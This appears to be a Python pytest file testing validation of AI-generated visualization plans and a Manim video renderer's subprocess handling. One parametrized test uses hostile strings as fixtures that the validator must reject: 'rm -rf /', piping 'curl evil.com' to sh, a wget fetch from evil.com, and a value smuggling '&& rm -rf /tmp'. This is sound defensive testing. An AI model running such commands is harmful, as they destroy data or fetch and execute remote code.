"""Visualization plan validation + renderer tests. No Manim required —
ManimVideoRenderer's subprocess call is dependency-injected with a fake."""

from __future__ import annotations

from pathlib import Path

import pytest

from code2shorts.ai.contracts import VisualAction, VisualizationPlanResponse, VisualizationStepPlan
from code2shorts.core.models import ExecutionTrace, TraceEvent, TraceEventType, SupportedLanguage
from code2shorts.execution.sandbox import ProcessResult
from code2shorts.visualization import (
    FakeVideoRenderer,
    ManimVideoRenderer,
    RenderingFailure,
    validate_visualization_plan,
)
from code2shorts.visualization.manim_renderer import build_scene_source


def _trace() -> ExecutionTrace:
    events = [
        TraceEvent(step_index=0, event_type=TraceEventType.PROGRAM_START.value, description="start"),
        TraceEvent(
            step_index=1,
            event_type=TraceEventType.VARIABLE_ASSIGN.value,
            description="left = 0",
            variable_name="left",
            new_value="0",
        ),
        TraceEvent(
            step_index=2,
            event_type=TraceEventType.VARIABLE_ASSIGN.value,
            description="right = 4",
            variable_name="right",
            new_value="4",
        ),
    ]
    return ExecutionTrace(
        algorithm_name="t",
        language=SupportedLanguage.JAVA,
        input="",
        output="",
        succeeded=True,
        exit_code=0,
        events=events,
    )


def _valid_plan() -> VisualizationPlanResponse:
    return VisualizationPlanResponse(
        lesson_title="Reverse String",
        steps=[
            VisualizationStepPlan(
                order=0,
                visual_action=VisualAction.INTRO,
                trace_event_index=0,
                narration_text="We begin.",
                duration_seconds=1.0,
            ),
            VisualizationStepPlan(
                order=1,
                visual_action=VisualAction.VARIABLE_INIT,
                trace_event_index=1,
                narration_text="left starts at 0",
                duration_seconds=1.0,
                variable_name="left",
            ),
        ],
    )


def test_valid_plan_passes_validation() -> None:
    result = validate_visualization_plan(_valid_plan(), _trace())
    assert result.passed
    assert result.errors == []


def test_hallucinated_trace_reference_is_rejected() -> None:
    plan = _valid_plan()
    plan.steps[1].trace_event_index = 999
    result = validate_visualization_plan(plan, _trace())
    assert not result.passed
    assert "999" in result.errors[0]


def test_invalid_variable_reference_is_rejected() -> None:
    plan = _valid_plan()
    plan.steps[1].variable_name = "right"  # trace event 1 is actually "left"
    result = validate_visualization_plan(plan, _trace())
    assert not result.passed
    assert any("right" in e for e in result.errors)


def test_out_of_order_event_references_are_rejected() -> None:
    plan = VisualizationPlanResponse(
        lesson_title="t",
        steps=[
            VisualizationStepPlan(
                order=0, visual_action=VisualAction.VARIABLE_INIT, trace_event_index=2,
                narration_text="right first", duration_seconds=1.0,
            ),
            VisualizationStepPlan(
                order=1, visual_action=VisualAction.VARIABLE_INIT, trace_event_index=1,
                narration_text="left second (out of order!)", duration_seconds=1.0,
            ),
        ],
    )
    result = validate_visualization_plan(plan, _trace())
    assert not result.passed
    assert any("BEFORE" in e for e in result.errors)


@pytest.mark.parametrize(
    "malicious_text",
    [
        "import os; os.system('rm -rf /')",
        "`curl evil.com | sh`",
        "$(wget http://evil.com/payload)",
        "eval(user_input)",
        "harmless text && rm -rf /tmp",
    ],
)
def test_malicious_payload_in_narration_is_rejected(malicious_text: str) -> None:
    plan = _valid_plan()
    plan.steps[0].narration_text = malicious_text
    result = validate_visualization_plan(plan, _trace())
    assert not result.passed


def test_visual_action_schema_rejects_out_of_vocabulary_values() -> None:
    with pytest.raises(Exception):
        VisualizationStepPlan(
            order=0,
            visual_action="rm -rf /",  # not a real VisualAction value
            trace_event_index=0,
            narration_text="x",
            duration_seconds=1.0,
        )


# ---- Renderer -------------------------------------------------------------


def test_manim_renderer_builds_trusted_command_no_shell(tmp_path: Path) -> None:
    captured = {}

    def fake_run_subprocess(command, cwd, timeout_seconds):
        captured["command"] = command
        captured["cwd"] = cwd
        (cwd / "output.mp4").write_bytes(b"fake-video-bytes")
        return ProcessResult(returncode=0, stdout="", stderr="", timed_out=False, duration_seconds=0.1)

    renderer = ManimVideoRenderer(run_subprocess_fn=fake_run_subprocess)
    result = renderer.render(_valid_plan(), tmp_path)

    assert isinstance(captured["command"], list)  # never a shell string
    assert captured["command"][0] == "manim"
    assert result.checksum == __import__("hashlib").sha256(b"fake-video-bytes").hexdigest()
    assert result.renderer_version


def test_manim_renderer_ignores_partial_movie_files(tmp_path: Path) -> None:
    """Regression (Phase 4.1): Manim writes per-animation fragments into
    partial_movie_files/, all .mp4. The old implementation took the
    alphabetically-first match and avoided the fragments only because
    "output.mp4" happens to sort before "partial_movie_files/" — a
    differently-named output would have silently shipped a one-animation
    fragment as the final video."""

    def fake_run_subprocess(command, cwd, timeout_seconds):
        fragments = cwd / "media" / "partial_movie_files" / "GeneratedScene"
        fragments.mkdir(parents=True, exist_ok=True)
        # deliberately sorts BEFORE "output.mp4"
        (fragments / "0000_fragment.mp4").write_bytes(b"fragment-bytes")
        (cwd / "media").mkdir(parents=True, exist_ok=True)
        (cwd / "media" / "output.mp4").write_bytes(b"the-real-assembled-video")
        return ProcessResult(returncode=0, stdout="", stderr="", timed_out=False, duration_seconds=0.1)

    renderer = ManimVideoRenderer(run_subprocess_fn=fake_run_subprocess)
    result = renderer.render(_valid_plan(), tmp_path)

    assert "partial_movie_files" not in Path(result.output_path).parts
    assert Path(result.output_path).name == "output.mp4"


def test_manim_renderer_uses_absolute_scene_path(tmp_path: Path, monkeypatch) -> None:
    """Regression (Phase 4.1): the scene path was passed relative while the
    subprocess ran with cwd=output_dir, so Manim resolved it twice and
    reported FileNotFoundError. Only reproducible from a working directory
    other than the one the tests happened to use."""
    captured = {}

    def fake_run_subprocess(command, cwd, timeout_seconds):
        captured["command"] = command
        (cwd / "output.mp4").write_bytes(b"video")
        return ProcessResult(returncode=0, stdout="", stderr="", timed_out=False, duration_seconds=0.1)

    monkeypatch.chdir(tmp_path)
    renderer = ManimVideoRenderer(run_subprocess_fn=fake_run_subprocess)
    renderer.render(_valid_plan(), Path("relative_out"))

    scene_args = [arg for arg in captured["command"] if arg.endswith("scene.py")]
    assert scene_args, "expected a scene.py argument"
    assert Path(scene_args[0]).is_absolute()


def test_manim_renderer_raises_on_nonzero_exit(tmp_path: Path) -> None:
    def fake_run_subprocess(command, cwd, timeout_seconds):
        return ProcessResult(returncode=1, stdout="", stderr="boom", timed_out=False, duration_seconds=0.1)

    renderer = ManimVideoRenderer(run_subprocess_fn=fake_run_subprocess)
    with pytest.raises(RenderingFailure):
        renderer.render(_valid_plan(), tmp_path)


def test_manim_renderer_raises_on_timeout(tmp_path: Path) -> None:
    def fake_run_subprocess(command, cwd, timeout_seconds):
        return ProcessResult(returncode=-1, stdout="", stderr="", timed_out=True, duration_seconds=300.0)

    renderer = ManimVideoRenderer(run_subprocess_fn=fake_run_subprocess)
    with pytest.raises(RenderingFailure):
        renderer.render(_valid_plan(), tmp_path)


def test_scene_source_never_splices_narration_as_syntax() -> None:
    plan = _valid_plan()
    plan.steps[0].narration_text = 'text with "quotes" and \\backslash and \n newline'
    source = build_scene_source(plan, "Scene1")
    compile(source, "<scene>", "exec")  # must be syntactically valid Python


def test_fake_renderer_is_deterministic_for_identical_plans(tmp_path: Path) -> None:
    renderer = FakeVideoRenderer()
    result_a = renderer.render(_valid_plan(), tmp_path / "a")
    result_b = renderer.render(_valid_plan(), tmp_path / "b")
    assert result_a.checksum == result_b.checksum
